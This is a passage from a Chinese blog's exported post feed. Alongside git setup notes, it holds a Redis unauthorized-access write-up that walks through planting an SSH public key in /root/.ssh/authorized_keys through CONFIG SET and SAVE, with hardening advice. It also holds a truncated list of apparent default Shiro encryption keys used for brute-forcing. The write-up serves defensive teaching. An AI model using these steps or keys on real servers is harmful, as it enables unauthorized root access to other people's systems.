&lt;你的仓库SSH地址&gt;</code>，然后会瞬间拉取成功，SSH 配置就完成了。</p><p>仓库SSH地址需要注意，如果本地 ~&#x2F;.ssh&#x2F;config 文件中有配置特定的HOST，需要和配置的相同</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Host ncgithub<span class="hljs-selector-class">.com</span><br>  HostName github<span class="hljs-selector-class">.com</span><br>  IdentityFile ~/.ssh/id_rsa_nc<br>  PreferredAuthentications publickey<br></code></pre></td></tr></table></figure><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">原始：<br>git <span class="hljs-keyword">clone</span> <span class="hljs-title">git</span>@github.com:C0isini/studynote.git<br><br>修改后：<br><br><br>git <span class="hljs-keyword">clone</span> <span class="hljs-title">git</span>@ncgithub.com:C0isini/studynote.git<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>application</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>application</tag>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git_sec</title>
    <link href="/2024/03/15/yunwei/applications/git/git_sec/"/>
    <url>/2024/03/15/yunwei/applications/git/git_sec/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>github 为了安全性需要禁止上传敏感内容，所以需要 .gitignore 文件来设置哪些文件不需要上传进行版本管理</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/dir/</span> 过滤整个文件夹<br>*<span class="hljs-string">.txt</span> 过滤所有<span class="hljs-string">.txt</span>文件<br><span class="hljs-string">/dir/config.php</span> 过滤具体文件<br></code></pre></td></tr></table></figure><p>说明：</p><p>过滤掉的文件不会上传，也就是说不会进行版本管理，本地还是会有的</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">/ 开头表示目录<br>* 通配多个字符<br>? 通配单个字符<br><span class="hljs-string">[]</span> 包含单个字符的匹配列表<br>! 表示不忽略匹配的文件或者目录，也就是会上传<br></code></pre></td></tr></table></figure><p>规则匹配策略：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">自上到下进行匹配<br></code></pre></td></tr></table></figure><h2 id="错误总结"><a href="#错误总结" class="headerlink" title="错误总结"></a>错误总结</h2><p>1、不生效原因</p><p>可能是已经在缓存中，清除缓存，重新上传</p><p>git rm -r –cached .</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>application</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>application</tag>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>redis_unauth</title>
    <link href="/2024/03/15/security/secvulns/redis/redis_unauth/"/>
    <url>/2024/03/15/security/secvulns/redis/redis_unauth/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Redis 是一个开源的使用 ANSI C 语言编写、遵守 BSD 协议、支持网络、可基于内存、分布式、可选持久性的键值对(Key-Value)存储数据库，并提供多种语言的 API。</p><p>当redis配置设置不当，可能会存在数据泄露、服务器入侵等安全风险</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>当redis服务存在未授权（没有设置密码+没有限制访问IP）或弱口令时，存在被利用 redis 的持久化功能和 config 命令（config 命令可设置持久化信息）的安全风险</p><p>redis 有两种持久化的方式：</p><p>1）快照模式（默认方式）RDB</p><p>快照模式是将内存中的数据以快照的方式写入问文件，默认文件名是 dump.rdb</p><p>默认配置：<br>save 900 1 # 900 秒内 1 个 key 改变就会持久化</p><p>save 300 10</p><p>save 60 10000</p><p>dbfilename dump.rdb # 持久化的文件名（不可存在路径，只能是文件名）</p><p>dir .&#x2F; # 持久化文件所在目录，可以设置绝对路径</p><p>缺陷：</p><p>意外宕机之后，会丢失上次快照到宕机时这段时间的数据</p><p>2）AOF 方式</p><p>redis 将每一个写命令都通过 write 函数追加到文件中（默认是 appendonly.aof）,当 redis 重启时会通过重新执行文件中保存的写命令来在内存中重建整个数据库的内容</p><p>配置：<br>appendonly yes# 启用日志追加持久化方式</p><p>#appendfsync always #每次收到写命令就立即强制写入磁盘，最慢，但是保证完全的持久化 不推荐使用<br># appendfsync everysec # 每秒强制写入磁盘一次，在性能和持久化方面做了很好的折中，推荐使用<br># appendfsync no #完全依赖操作系统，性能最好，持久化没有保证</p><h2 id="风险"><a href="#风险" class="headerlink" title="风险"></a>风险</h2><h3 id="数据泄露风险"><a href="#数据泄露风险" class="headerlink" title="数据泄露风险"></a>数据泄露风险</h3><p>redis服务没有访问授权限制，任意用户可登录，造成服务中存储的数据被任意用户获取，造成数据泄露</p><h3 id="服务器入侵风险"><a href="#服务器入侵风险" class="headerlink" title="服务器入侵风险"></a>服务器入侵风险</h3><p>redis服务没有访问授权限制，且在服务中可以修改服务配置，例如修改持久化配置，造成恶意用户登录服务，修改配置实现入侵</p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="未授权-弱口令访问"><a href="#未授权-弱口令访问" class="headerlink" title="未授权&#x2F;弱口令访问"></a>未授权&#x2F;弱口令访问</h3><h4 id="构建SSH免登录"><a href="#构建SSH免登录" class="headerlink" title="构建SSH免登录"></a>构建SSH免登录</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>攻击主机用户的ssh公钥(～&#x2F;.ssh&#x2F;id_rsa.pub)写入目标主机的免登录配置文件authorized_keys中。</p><p>写入任意key的value值为ssh公钥内容，将该数据持久化到指定存在的目录&#x2F;user&#x2F;.ssh中的指定authorized_keys文件中。</p><h5 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h5><p>1、redis服务可未授权访问或弱口令访问</p><p>2、可以使用config命令修改持久化配置</p><p>3、ssh 支持使用 key 的方式进行认证登录</p><p>#RSAAuthentication yes</p><p>#PubkeyAuthentication yes</p><p>AuthorizedKeysFile     .ssh&#x2F;authorized_keys</p><h5 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h5><p>1、获取持久化目录及文件</p><p>config get dir</p><p>config get dbfilename</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">10</span>.<span class="hljs-number">222</span>.<span class="hljs-number">28</span>.<span class="hljs-number">37</span>:<span class="hljs-number">6379</span>&gt; config get dir<br><span class="hljs-attribute">1</span>) <span class="hljs-string">&quot;dir&quot;</span><br><span class="hljs-attribute">2</span>) <span class="hljs-string">&quot;/var/lib/redis&quot;</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">222</span>.<span class="hljs-number">28</span>.<span class="hljs-number">37</span>:<span class="hljs-number">6379</span>&gt; config get dbfilename<br><span class="hljs-attribute">1</span>) <span class="hljs-string">&quot;dbfilename&quot;</span><br><span class="hljs-attribute">2</span>) <span class="hljs-string">&quot;dump.rdb&quot;</span><br></code></pre></td></tr></table></figure><p>2、设置持久化目录和文件为指定目录文件</p><p>config set dir &#x2F;root&#x2F;.ssh</p><p>config set dbfilename authorized_keys</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.222.28.37:6379</span>&gt; config set dir /root/.ssh<br>OK<br><span class="hljs-number">10.222.28.37:6379</span>&gt; config set dbfilename authorized_keys<br>OK<br><br><span class="hljs-number">10.222.28.37:6379</span>&gt; config get dir<br><span class="hljs-number">1</span>) <span class="hljs-string">&quot;dir&quot;</span><br><span class="hljs-number">2</span>) <span class="hljs-string">&quot;/root/.ssh&quot;</span><br><span class="hljs-number">10.222.28.37:6379</span>&gt; config get dbfilename<br><span class="hljs-number">1</span>) <span class="hljs-string">&quot;dbfilename&quot;</span><br><span class="hljs-number">2</span>) <span class="hljs-string">&quot;authorized_keys&quot;</span><br></code></pre></td></tr></table></figure><p>3、公钥写入并持久化</p><p>公钥信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  ~ <span class="hljs-built_in">cat</span> ~/.ssh/id_rsa.pub <br>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDlzXhaC00n27yfFRNqT2Be+HN+bbzGScxkVlrrL3/TOm57YokSlozrJbil5XXGVGmX8AIM2kcvVLQWHq6bwmu03ew1MQHF/0a//tEP0jCEPARpD28PpnCe92pqBqde+ehlrS9SnFdNZspqmPVjLV4KiEWpL4opwhzDG6GtSA2YQy8Mv4yBH3FETcI4YSireliynZfwTfz6fpDPIQxEnH7cl0u2zMez209hfwIxRGR8e1XSaMlIdl2sntzEriXtOrqjjQ8pSKJp8+HK2S4VzTo5LZEFTqDn29wp5bJYFifFxTqayw2FLPtT0lBQV2ZeQFY9qasvmLEEOUYlDw2b2Scs2hwdvauSRuo+Dyfsws9JdpvVE5s2+pFLv24QaB+fCWGH4UmSUDXWdkA4YYpUME8sCdhLZRQEo5lnlbS/qaRDG4KU+egexR1o7QsigA5a06T73SYnYzGzao2ys1ww9jZgJsWr4w4t3NvGqTQJC4hjAbHr0BvVW+29C/38FGEL+/5bUFUVuJYELYQIM+EDeZR6rBtOmNKm7PgK8DDebdA63e26bGOsfjHmUC10qQaaSM7Tv5SvTIOEQxJfpyqQG9utObRTKTnXT8D4doYfaHth+pot69UbmlspEfwBdw6dK+CUkk6P4fTcrWGwIIZoPO5NPPY1hnpOvCDuUzCqgPLomQ== admin@110.<span class="hljs-built_in">local</span><br></code></pre></td></tr></table></figure><p>设置key   set xxx “\n\n\n用户公钥\n\n\n”</p><p>持久化  save</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.222.28.37:6379</span>&gt; set xxx <span class="hljs-string">&quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDlzXhaC00n27yfFRNqT2Be+HN+bbzGScxkVlrrL3/TOm57YokSlozrJbil5XXGVGmX8AIM2kcvVLQWHq6bwmu03ew1MQHF/0a//tEP0jCEPARpD28PpnCe92pqBqde+ehlrS9SnFdNZspqmPVjLV4KiEWpL4opwhzDG6GtSA2YQy8Mv4yBH3FETcI4YSireliynZfwTfz6fpDPIQxEnH7cl0u2zMez209hfwIxRGR8e1XSaMlIdl2sntzEriXtOrqjjQ8pSKJp8+HK2S4VzTo5LZEFTqDn29wp5bJYFifFxTqayw2FLPtT0lBQV2ZeQFY9qasvmLEEOUYlDw2b2Scs2hwdvauSRuo+Dyfsws9JdpvVE5s2+pFLv24QaB+fCWGH4UmSUDXWdkA4YYpUME8sCdhLZRQEo5lnlbS/qaRDG4KU+egexR1o7QsigA5a06T73SYnYzGzao2ys1ww9jZgJsWr4w4t3NvGqTQJC4hjAbHr0BvVW+29C/38FGEL+/5bUFUVuJYELYQIM+EDeZR6rBtOmNKm7PgK8DDebdA63e26bGOsfjHmUC10qQaaSM7Tv5SvTIOEQxJfpyqQG9utObRTKTnXT8D4doYfaHth+pot69UbmlspEfwBdw6dK+CUkk6P4fTcrWGwIIZoPO5NPPY1hnpOvCDuUzCqgPLomQ== admin@110.local\n\n\n&quot;</span><br>OK<br><span class="hljs-number">10.222.28.37:6379</span>&gt; save<br>OK<br><br></code></pre></td></tr></table></figure><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>1、设置强口令</p><p>强口令规则：包含大小写子母、数字和特殊字符，长度在10位以上</p><p>redis.conf中配置</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">requirepass foobared</span><br></code></pre></td></tr></table></figure><p>2、开启protected-mode，限制本地登录</p><p>redis.conf中配置</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">protected</span>-mode yes<br></code></pre></td></tr></table></figure><p>3、监听本地</p><p>redis.conf中配置</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">bind</span> <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>4、禁用&#x2F;重命名危险命令（需重启服务）</p><p>常见危险命令：</p><p>flushall   清除所有数据</p><p>flushdb  清除当前db</p><p>keys *  获取所有key</p><p>config   客户端设置服务端命令</p><p>禁用危险命令：</p><p>配置文件中增加 rename-command commandname “” 配置</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> flushall <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> flushdb <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-built_in">keys</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> config <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1:6379</span>&gt; flushall<br>(error) ERR unknown command &#x27;flushall&#x27;<br><span class="hljs-number">127.0.0.1:6379</span>&gt; flushdb<br>(error) ERR unknown command &#x27;flushdb&#x27;<br><span class="hljs-number">127.0.0.1:6379</span>&gt; keys *<br>(error) ERR unknown command &#x27;keys&#x27;<br><span class="hljs-number">127.0.0.1:6379</span>&gt; config get dir<br>(error) ERR unknown command &#x27;config&#x27;<br></code></pre></td></tr></table></figure><p>重命名危险命令：</p><p>配置文件中增加 rename-command oldname newname 配置</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">flushall</span> <span class="hljs-title">deleteall</span><br><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">flushdb</span> <span class="hljs-title">deleteall</span><br></code></pre></td></tr></table></figure><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1:6379</span>&gt; flushall<br>(error) ERR unknown command &#x27;flushall&#x27;<br><span class="hljs-number">127.0.0.1:6379</span>&gt; deleteall<br>OK<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>unauth</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sorl_keys</title>
    <link href="/2024/03/14/security/secvulns/solr/solr_keys/"/>
    <url>/2024/03/14/security/secvulns/solr/solr_keys/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27;kPH+bIxk5D2deZiIxcaaaA==&#x27;, &#x27;4AvVhmFLUs0KTA3Kprsdag==&#x27;, &#x27;fCq+/xW488hMTCE+cmJ3FF==&#x27;, &#x27;zSyK5Kp6PZAAjlT+eeNMlg==&#x27;, &#x27;WkhBTkdYSUFPSEVJX0NBVA==&#x27;,<br>&#x27;RVZBTk5JR0hUTFlfV0FPVQ==&#x27;, &#x27;U3ByaW5nQmxhZGUAAAAAAA==&#x27;, &#x27;cGljYXMAAAAAAAAAAAAAAA==&#x27;, &#x27;d2ViUmVtZW1iZXJNZUtleQ==&#x27;,<br>&#x27;fsHspZw/92PrS3XrPW+vxw==&#x27;,<br>&#x27;sHdIjUN6tzhl8xZMG3ULCQ==&#x27;, &#x27;WuB+y2gcHRnY2Lg9+Aqmqg==&#x27;, &#x27;ertVhmFLUs0KTA3Kprsdag==&#x27;, &#x27;2itfW92XazYRi5ltW0M2yA==&#x27;, &#x27;6ZmI6I2j3Y+R1aSn5BOlAA==&#x27;,<br>&#x27;f/SY5TIve5WWzT4aQlABJA==&#x27;, &#x27;Jt3C93kMR9D5e8QzwfsiMw==&#x27;, &#x27;aU1pcmFjbGVpTWlyYWNsZQ==&#x27;,<br>&#x27;XTx6CKLo/SdSgub+OPHSrw==&#x27;, &#x27;8AvVhmFLUs0KTA3Kprsdag==&#x27;,<br>&#x27;66v1O8keKNV3TTcGPK1wzg==&#x27;, &#x27;Q01TX0JGTFlLRVlfMjAxOQ==&#x27;, &#x27;5AvVhmFLUS0ATA4Kprsdag==&#x27;, &#x27;ZmFsYWRvLnh5ei5zaGlybw==&#x27;, &#x27;0AvVhmFLUs0KTA3Kprsdag==&#x27;,<br>&#x27;r0e3c16IdVkouZgk1TKVMg==&#x27;, &#x27;Z3VucwAAAAAAAAAAAAAAAA==&#x27;, &#x27;5J7bIJIV0LQSN3c9LPitBQ==&#x27;, &#x27;ZnJlc2h6Y24xMjM0NTY3OA==&#x27;, &#x27;yeAAo1E8BOeAYfBlm4NG9Q==&#x27;,<br>&#x27;a3dvbmcAAAAAAAAAAAAAAA==&#x27;, &#x27;4BvVhmFLUs0KTA3Kprsdag==&#x27;, &#x27;s0KTA3mFLUprK4AvVhsdag==&#x27;,<br>&#x27;yNeUgSzL/CfiWw1GALg6Ag==&#x27;, &#x27;OY//C4rhfwNxCQAQCrQQ1Q==&#x27;,<br>&#x27;fCq+/xW488hMTCD+cmJ3aQ==&#x27;, &#x27;ZAvph3dsQs0FSL3SDFAdag==&#x27;, &#x27;MTIzNDU2NzgxMjM0NTY3OA==&#x27;, &#x27;1AvVhdsgUs0FSA3SDFAdag==&#x27;, &#x27;Bf7MfkNR0axGGptozrebag==&#x27;,<br>&#x27;1QWLxg+NYmxraMoxAXu/Iw==&#x27;, &#x27;6AvVhmFLUs0KTA3Kprsdag==&#x27;, &#x27;6NfXkC7YVCV5DASIrEm1Rg==&#x27;, &#x27;2AvVhdsgUs0FSA3SDFAdag==&#x27;, &#x27;9FvVhtFLUs0KnA3Kprsdyg==&#x27;,<br>&#x27;OUHYQzxQ/W9e/UjiAGu6rg==&#x27;, &#x27;ClLk69oNcA3m+s0jIMIkpg==&#x27;, &#x27;vXP33AonIp9bFwGl7aT7rA==&#x27;,<br>&#x27;NGk/3cQ6F5/UNPRh8LpMIg==&#x27;, &#x27;MPdCMZ9urzEA50JDlDYYDg==&#x27;,<br>&#x27;c2hpcm9fYmF0aXMzMgAAAA==&#x27;, &#x27;XgGkgqGqYrix9lI6vxcrRw==&#x27;, &#x27;2A2V+RFLUs+eTA3Kpr+dag==&#x27;, &#x27;5AvVhmFLUs0KTA3Kprsdag==&#x27;, &#x27;3AvVhmFLUs0KTA3Kprsdag==&#x27;,<br>&#x27;WcfHGU25gNnTxTlmJMeSpw==&#x27;, &#x27;bWljcm9zAAAAAAAAAAAAAA==&#x27;, &#x27;bWluZS1hc3NldC1rZXk6QQ==&#x27;, &#x27;bXRvbnMAAAAAAAAAAAAAAA==&#x27;, &#x27;6ZmI6I2j5Y+R5aSn5ZOlAA==&#x27;,<br>&#x27;3JvYhmBLUs0ETA5Kprsdag==&#x27;, &#x27;A7UzJgh1+EWj5oBFi+mSgw==&#x27;, &#x27;Is9zJ3pzNh2cgTHB4ua3+Q==&#x27;, &#x27;25BsmdYwjnfcWmnhAciDDg==&#x27;, &#x27;cmVtZW1iZXJNZQAAAAAAAA==&#x27;,<br>&#x27;7AvVhmFLUs0KTA3Kprsdag==&#x27;, &#x27;3qDVdLawoIr1xFd6ietnwg==&#x27;, &#x27;Y1JxNSPXVwMkyvES/kJGeQ==&#x27;, &#x27;xVmmoltfpb8tTceuT5R7Bw==&#x27;, &#x27;O4pdf+7e+mZe8NyxMTPJmQ==&#x27;,<br>&#x27;SDKOLKn2J1j/2BHjeZwAoQ==&#x27;, &#x27;a2VlcE9uR29pbmdBbmRGaQ==&#x27;, &#x27;V2hhdCBUaGUgSGVsbAAAAA==&#x27;, &#x27;GAevYnznvgNCURavBhCr1w==&#x27;, &#x27;hBlzKg78ajaZuTE0VLzDDg==&#x27;,<br>&#x27;2cVtiE83c4lIrELJwKGJUw==&#x27;, &#x27;U3BAbW5nQmxhZGUAAAAAAA==&#x27;, &#x27;9AvVhmFLUs0KTA3Kprsdag==&#x27;, &#x27;SkZpbmFsQmxhZGUAAAAAAA==&#x27;, &#x27;lT2UvDUmQwewm6mMoiw4Ig==&#x27;,<br>&#x27;HWrBltGvEZc14h9VpMvZWw==&#x27;, &#x27;wGiHplamyXlVB11UXWol8g==&#x27;, &#x27;8BvVhmFLUs0KTA3Kprsdag==&#x27;, &#x27;bya2HkYo57u6fWh5theAWw==&#x27;, &#x27;IduElDUpDDXE677ZkhhKnQ==&#x27;,<br>&#x27;1tC/xrDYs8ey+sa3emtiYw==&#x27;, &#x27;MTIzNDU2Nzg5MGFiY2RlZg==&#x27;, &#x27;c+3hFGPjbgzGdrC+MHgoRQ==&#x27;, &#x27;rPNqM6uKFCyaL10AK51UkQ==&#x27;, &#x27;5aaC5qKm5oqA5pyvAAAAAA==&#x27;,<br>&#x27;cGhyYWNrY3RmREUhfiMkZA==&#x27;, &#x27;MzVeSkYyWTI2OFVLZjRzZg==&#x27;, &#x27;YI1+nBV//m7ELrIyDHm6DQ==&#x27;, &#x27;empodDEyMwAAAAAAAAAAAA==&#x27;, &#x27;NsZXjXVklWPZwOfkvk6kUA==&#x27;,<br>&#x27;ZUdsaGJuSmxibVI2ZHc9PQ==&#x27;, &#x27;L7RioUULEFhRyxM7a2R/Yg==&#x27;, &#x27;i45FVt72K2kLgvFrJtoZRw==&#x27;, &#x27;bXdrXl9eNjY2KjA3Z2otPQ==&#x27;, &#x27;sgIQrqUVxa1OZRRIK3hLZw==&#x27;,<br>&#x27;tiVV6g3uZBGfgshesAQbjA==&#x27;, &#x27;GsHaWo4m1eNbE0kNSMULhg==&#x27;, &#x27;l8cc6d2xpkT1yFtLIcLHCg==&#x27;, &#x27;KU471rVNQ6k7PQL4SqxgJg==&#x27;, &#x27;6Zm+6I2j5Y+R5aS+5ZOlAA==&#x27;,<br>&#x27;kPH+bIxk5D2deZiIxcabaA==&#x27;, &#x27;kPH+bIxk5D2deZiIxcacaA==&#x27;, &#x27;3AvVhdAgUs0FSA4SDFAdBg==&#x27;, &#x27;4AvVhdsgUs0F563SDFAdag==&#x27;, &#x27;FL9HL9Yu5bVUJ0PDU1ySvg==&#x27;,<br>&#x27;5RC7uBZLkByfFfJm22q/Zw==&#x27;, &#x27;eXNmAAAAAAAAAAAAAAAAAA==&#x27;, &#x27;fdCEiK9YvLC668sS43CJ6A==&#x27;, &#x27;FJoQCiz0z5XWz2N2LyxNww==&#x27;,<br>&#x27;HeUZ/LvgkO7nsa18ZyVxWQ==&#x27;,<br>&#x27;HoTP07fJPKIRLOWoVXmv+Q==&#x27;, &#x27;iycgIIyCatQofd0XXxbzEg==&#x27;,<br>&#x27;m0/5ZZ9L4jjQXn7MREr/bw==&#x27;, &#x27;NoIw91X9GSiCrLCF03ZGZw==&#x27;, &#x27;oPH+bIxk5E2enZiIxcqaaA==&#x27;,<br>&#x27;QAk0rp8sG0uJC4Ke2baYNA==&#x27;, &#x27;Rb5RN+LofDWJlzWAwsXzxg==&#x27;, &#x27;s2SE9y32PvLeYo+VGFpcKA==&#x27;, &#x27;SrpFBcVD89eTQ2icOD0TMg==&#x27;, &#x27;U0hGX2d1bnMAAAAAAAAAAA==&#x27;,<br>&#x27;Us0KvVhTeasAm43KFLAeng==&#x27;, &#x27;Ymx1ZXdoYWxlAAAAAAAAAA==&#x27;, &#x27;YWJjZGRjYmFhYmNkZGNiYQ==&#x27;, &#x27;zIiHplamyXlVB11UXWol8g==&#x27;, &#x27;ZjQyMTJiNTJhZGZmYjFjMQ==&#x27;,<br>&#x27;HOlg7NHb9potm0n5s4ic0Q==&#x27;, &#x27;2AvVhdsgUs0FSA3SaFAdfg==&#x27;, &#x27;4rvVhmFLUs0KAT3Kprsdag==&#x27;, &#x27;AF05JAuyuEB1ouJQ9Y9Phg==&#x27;, &#x27;UGlzMjAxNiVLeUVlXiEjLw==&#x27;,<br>&#x27;2AvVhdsgERdsSA3SDFAdag==&#x27;, &#x27;QF5HMyZAWDZYRyFnSGhTdQ==&#x27;, &#x27;8AvVhdsgUs0FSA3SDFAdag==&#x27;, &#x27;4AvVhmFLUs5KTA1Kprsdag==&#x27;, &#x27;4WCZSJyqdUQsije93aQIRg==&#x27;,<br>&#x27;3rvVhmFLUs0KAT3Kprsdag==&#x27;, &#x27;b2EAAAAAAAAAAAAAAAAAAA==&#x27;, &#x27;3AvVhMFLIs0KTA3Kprsdag==&#x27;, &#x27;4AvVhm2LUs0KTA3Kprsdag==&#x27;, &#x27;2AvVCXsxUs0FSA7SYFjdQg==&#x27;,<br>&#x27;Cj6LnKZNLEowAZrdqyH/Ew==&#x27;, &#x27;3qDVdLawoIr1xFd6ietnsg==&#x27;, &#x27;2AvVhdsgUsOFSA3SDFAdag==&#x27;, &#x27;FP7qKJzdJOGkzoQzo2wTmA==&#x27;, &#x27;wyLZMDifwq3sW1vhhHpgKA==&#x27;,<br>&#x27;5AvVhCsgUs0FSA3SDFAdag==&#x27;, &#x27;pbnA+Qzen1vjV3rNqQBLHg==&#x27;, &#x27;GhrF5zLfq1Dtadd1jlohhA==&#x27;, &#x27;2AvVhmFLUs0KTA3Kprsdag==&#x27;, &#x27;mIccZhQt6EBHrZIyw1FAXQ==&#x27;,<br>&#x27;4AvVhmFLUs0KTA3Kprseaf==&#x27;, &#x27;GHxH6G3LFh8Zb3NwoRgfFA==&#x27;, &#x27;B9rPF8FHhxKJZ9k63ik7kQ==&#x27;, &#x27;3AvVhmFLUs0KTA3KaTHGFg==&#x27;, &#x27;M2djA70UBBUPDibGZBRvrA==&#x27;,<br>&#x27;QDFCnfkLUs0KTA3Kprsdag==&#x27;, &#x27;2adsfasdqerqerqewradsf==&#x27;, &#x27;3Av2hmFLAs0BTA3Kprsd6E==&#x27;, &#x27;4AvVhmFLUsOKTA3Kprsdag==&#x27;, &#x27;Z3VucwACAOVAKALACAADSA==&#x27;,<br>&#x27;4AvVhmFLUs0KTA3KAAAAAA==&#x27;, &#x27;sBv2t3okbdm3U0r2EVcSzB==&#x27;, &#x27;5oiR5piv5p2h5ZK46bG8IQ==&#x27;,<br>&#x27;TGMPe7lGO/Gbr38QiJu1/w==&#x27;, &#x27;4AvVhmFLUs0TTA3Kprsdag==&#x27;,<br>&#x27;YWdlbnRAZG1AMjAxOHN3Zg==&#x27;, &#x27;Z3VucwAAAAAAAAAAAAABBB==&#x27;, 